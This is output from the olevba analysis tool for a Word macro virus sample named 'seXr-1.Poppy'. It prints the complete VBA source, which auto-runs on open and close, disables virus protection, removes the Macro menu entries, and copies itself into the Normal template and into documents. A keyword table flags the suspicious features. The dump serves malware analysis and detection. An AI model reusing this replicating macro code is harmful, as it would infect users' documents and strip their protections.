olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Cross.W4-522fc8d367b3def247cedcd120eae36fc2736701
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Cross.W4-522fc8d367b3def247cedcd120eae36fc2736701 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO X.bas 
in file: Virus.MSOffice.Cross.W4-522fc8d367b3def247cedcd120eae36fc2736701 - OLE stream: 'Macros/VBA/X'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
Application.VBE.ActiveVBProject.VBComponents("X").Export "c:\X.VIC"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "X" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "X" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set SexR = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set SexR = ActiveDocument.VBProject
With SexR
With .VBComponents.Import("c:\X.VIC")
End With
End With
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
' seXr-1.Poppy (Fast, Small, Full Stealth and SR-1 Compatable)
' by VicodinES
End Sub
Sub AutoClose()
Call AutoOpen
End Sub
Sub AutoExit()
Call AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

